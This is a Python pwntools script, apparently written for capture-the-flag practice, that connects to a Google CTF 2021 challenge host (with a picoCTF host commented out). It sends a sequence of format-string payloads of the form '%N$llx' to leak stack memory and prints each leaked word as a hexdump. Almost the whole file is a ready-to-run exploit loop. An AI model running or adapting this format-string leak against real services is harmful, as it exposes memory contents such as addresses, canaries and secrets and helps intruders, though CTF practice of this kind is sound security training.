from pwn import *

# Configuration
context.log_level = 'error'

# Google ctf example:
DOMAIN   = "pwn-notebook.2021.ctfcompetition.com"
PORT     = 1337
INPUT    = b"3"
ARCH     = "64"
START    = b"< "
END      = b" "

# Pico ctf example:
# DOMAIN   = "mercury.picoctf.net"
# PORT     = 16439
# INPUT    = b"1"
# ARCH     = "32"
# START    = b"token:\n"
# END      = b"\n"

def hexdump(data,offset):
    chrByte    = ""
    hexByte    = ""
    if(ARCH == "64"):
        packed = p64(data)
    else:
        packed = p32(data)
    for byte in packed:
        if(0x20 <= byte <= 0x7e):                           # Printable.
            chrByte += chr(byte)
        else:
            chrByte += "."                                  # If not printable -> dot.
        hexByte+="%.2x " % byte
    finalOffset = (hex(offset)[2:]).rjust(8,"0")+":  "
    finalHex    = hexByte + "  "
    finalChar   = chrByte.rjust(8,".")
    print(finalOffset+finalHex+finalChar)

def stackLeak():
    print("<---------------Stack Leaking--------------->")
    stackOffset = 1
    byteOffset  = 0
    if(ARCH=="64"):                                         # 64-bit else 32-bit. 
        format  = "$llx"                                    # Memory 64 bit long long hex.
        memSize = 8                                         # 64-bit -> 8-bytes.
    else:
        format  = "$lx"                                     # Memory 32 bit long hex.
        memSize = 4                                         # 32-bit -> 4-bytes.
    while(True):
        payload = bytes(f"%{stackOffset}{format}",'utf-8')  # Iterating offset and leaking the stack.
        p = remote(DOMAIN,PORT)                             # Domain and port for nc.
        p.sendline(INPUT)                                   # Input that will trigger the format string vulnerability.
        p.sendline(payload)                                 # Trigger the vulnerability.
        p.recvuntil(START)
        try:
            data = int(p.recvuntil(END),16)                 # Convert bytes to decimal
        except Exception as e:
            print(e)
        p.close() 
        hexdump(data,byteOffset)                            # Print hex dump of the stack.
        stackOffset += 1                                    # Moving forward stack offset.
        byteOffset  += memSize                              # Moving forward byte offset.

stackLeak()
